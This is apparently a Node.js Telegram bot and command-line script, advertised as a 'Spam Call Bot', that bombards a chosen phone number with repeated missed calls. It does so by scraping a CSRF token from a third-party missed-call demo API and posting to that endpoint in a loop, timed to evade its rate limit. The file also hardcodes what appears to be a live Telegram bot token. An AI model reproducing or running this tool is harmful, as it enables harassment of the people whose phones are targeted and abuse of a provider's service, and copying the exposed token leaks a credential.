const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});
const TOKEN = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(TOKEN, {polling: true});
const INTRO_VIDEO = 'https://youtu.be/CsrsR_sC2jE?si=H-uK43vai-cZhK9_';
const PROCESSING_VIDEO = 'https://youtu.be/CsrsR_sC2jE?si=H-uK43vai-cZhK9_';
const SUCCESS_VIDEO = 'https://youtu.be/CsrsR_sC2jE?si=H-uK43vai-cZhK9_';
const ERROR_VIDEO = 'https://youtu.be/CsrsR_sC2jE?si=H-uK43vai-cZhK9_';
const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
const MAX_CALLS = 19;
function getCurrentDateTime() {
  const now = new Date();
  const day = days[now.getDay()];
  const date = now.getDate();
  const month = months[now.getMonth()];
  const year = now.getFullYear();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  
  return `${day}, ${date} ${month} ${year} | ${hours}:${minutes}:${seconds}`;
}
async function spamCall(phoneNumber, count) {
  if (count > MAX_CALLS) {
    return { 
      success: 0, 
      total: count, 
      error: `Maximum ${MAX_CALLS} calls allowed per request` 
    };
  }
  const url = "https://www.citcall.com/demo/misscallapi.php";
  try {
    const response = await axios.get(url);
    const tokenMatch = response.data.match(/id="csrf_token" value="(.*?)">/);
    if (!tokenMatch) throw new Error("Token not found");
    const token = tokenMatch[1];
    let successCount = 0;
    const headers = {
      'x-requested-with': 'XMLHttpRequest'
    };
    const data = {
      cid: phoneNumber,
      trying: '0',
      csrf_token: token
    };
    for (let i = 0; i < count; i++) {
      try {
        const sendResponse = await axios.post(url, data, { headers });
        if (sendResponse.data.includes('Success')) {
          successCount++;
          console.log(`[${getCurrentDateTime()}] [${successCount}] Sended to => ${phoneNumber}`);
        } else {
          console.log(`\n[${getCurrentDateTime()}] * Limit *`);
          console.log(`\n[${getCurrentDateTime()}] * Try one hour ago or try tomorrow *`);
          break;
        }
        await new Promise(resolve => setTimeout(resolve, 4800));
      } catch (error) {
        console.error(`[${getCurrentDateTime()}] Error during request:`, error.message);
        break;
      }
    }
    return { success: successCount, total: count };
  } catch (error) {
    console.error(`[${getCurrentDateTime()}] Error:`, error.message);
    return { success: 0, total: count, error: error.message };
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendVideo(chatId, INTRO_VIDEO, {
    caption: `🔥 *Spam Call Bot by Xractz - IndoSec* 🔥\n📅 ${getCurrentDateTime()}\n\n🚀 Powerful call service with visual feedback\n⏳ 5-second delay between calls to avoid limits\n📞 Use Country Code (ex: 62xxxxx29)\n⚠️ Maximum ${MAX_CALLS} calls per request`,
    parse_mode: 'Markdown',
    reply_markup: {
      keyboard: [
        [{ text: '📱 Start Spam Call' }],
        [{ text: 'ℹ️ Help' }],
        [{ text: '🌟 Features' }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  });
});
bot.onText(/📱 Start Spam Call/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendVideo(chatId, INTRO_VIDEO, {
    caption: `📅 ${getCurrentDateTime()}\n\n📞 Enter phone number with country code:\n\nExample: 628123456789\n⚠️ Maximum ${MAX_CALLS} calls allowed`,
    reply_markup: {
      force_reply: true
    }
  }).then(() => {
    bot.once('message', (msg) => {
      const phoneNumber = msg.text;
      if (!phoneNumber.match(/^\d+$/)) {
        return bot.sendVideo(chatId, ERROR_VIDEO, {
          caption: `📅 ${getCurrentDateTime()}\n\n❌ Invalid number! Only digits allowed.\n\nTry again with format: 628123456789`
        });
      }
      bot.sendVideo(chatId, INTRO_VIDEO, {
        caption: `📅 ${getCurrentDateTime()}\n\n🔢 Enter number of calls to send (max ${MAX_CALLS}):`,
        reply_markup: {
          force_reply: true
        }
      }).then(() => {
        bot.once('message', async (msg) => {
          const count = parseInt(msg.text);
          if (isNaN(count)) {
            return bot.sendVideo(chatId, ERROR_VIDEO, {
              caption: `📅 ${getCurrentDateTime()}\n\n❌ Invalid count! Only numbers allowed.`
            });
          }
          if (count > MAX_CALLS) {
            return bot.sendVideo(chatId, ERROR_VIDEO, {
              caption: `📅 ${getCurrentDateTime()}\n\n❌ Maximum ${MAX_CALLS} calls allowed per request!`
            });
          }
          const processingMsg = await bot.sendVideo(chatId, PROCESSING_VIDEO, {
            caption: `📅 ${getCurrentDateTime()}\n\n⏳ Processing your request...\n\nPlease wait while we send your calls`
          });
          try {
            const result = await spamCall(phoneNumber, count);
            if (result.error) {
              await bot.editMessageCaption({
                chat_id: chatId,
                message_id: processingMsg.message_id,
                caption: `📅 ${getCurrentDateTime()}\n\n❌ Error: ${result.error}\n\nTry again later`
              });
            } else {
              await bot.sendVideo(chatId, SUCCESS_VIDEO, {
                caption: `📅 ${getCurrentDateTime()}\n\n✅ Success!\n\nSent ${result.success} of ${result.total} calls to ${phoneNumber}`,
                reply_markup: {
                  keyboard: [
                    [{ text: '📱 New Spam Call' }],
                    [{ text: '🏠 Main Menu' }]
                  ],
                  resize_keyboard: true
                }
              });
            }
          } catch (error) {
            await bot.editMessageCaption({
              chat_id: chatId,
              message_id: processingMsg.message_id,
              caption: `📅 ${getCurrentDateTime()}\n\n❌ Failed: ${error.message}`
            });
          }
        });
      });
    });
  });
});
bot.onText(/ℹ️ Help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendVideo(chatId, INTRO_VIDEO, {
    caption: `📅 ${getCurrentDateTime()}\n\n📚 *Spam Call Bot Help* 📚

🔹 *How to Use:*
1. Tap "Start Spam Call"
2. Enter phone number (628xxxx)
3. Enter call count (max ${MAX_CALLS})
4. Watch the magic happen!
⚠️ *Notes:*
• 5-second delay between calls
• Maximum ${MAX_CALLS} calls per request
• Don't abuse the service
• Country code required`,
    parse_mode: 'Markdown'
  });
});
bot.onText(/🌟 Features/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendVideo(chatId, INTRO_VIDEO, {
    caption: `📅 ${getCurrentDateTime()}\n\n✨ *Premium Features* ✨
• Visual feedback system
• Anti-spam protection
• Real-time status updates
• User-friendly interface
• Secure and reliable
• Maximum ${MAX_CALLS} calls per request

🔥 The most advanced call service available!`,
    parse_mode: 'Markdown'
  });
});
console.log(`[${getCurrentDateTime()}] EXECUTOR LORDHOZOO SPAM CALL MAX `);
console.log(`[${getCurrentDateTime()}] CLI Active and Running`);
console.log(`[${getCurrentDateTime()}] This tool delays 5 seconds per spam so as not to limit!`);
console.log(`[${getCurrentDateTime()}] Maximum ${MAX_CALLS} calls per request`);
console.log(`[${getCurrentDateTime()}] Use Country Code (ex: 62)`);
readline.question(`[${getCurrentDateTime()}] No : `, (no) => {
  if (!no.match(/^\d+$/)) {
    console.log(`\n[${getCurrentDateTime()}] * Only Number *`);
    process.exit();
  }
  readline.question(`[${getCurrentDateTime()}] Count (max ${MAX_CALLS}) : `, async (jml) => {
    if (!jml.match(/^\d+$/)) {
      console.log(`\n[${getCurrentDateTime()}] * Only Number *`);
      process.exit();
    }
    const count = parseInt(jml);
    if (count > MAX_CALLS) {
      console.log(`\n[${getCurrentDateTime()}] * Maximum ${MAX_CALLS} calls allowed *`);
      process.exit();
    }
    console.log();
    await spamCall(no, count);
    readline.close();
  });
});
setInterval(() => {
  console.log(`[${getCurrentDateTime()}] CLI Still Active`);
}, 60000); 
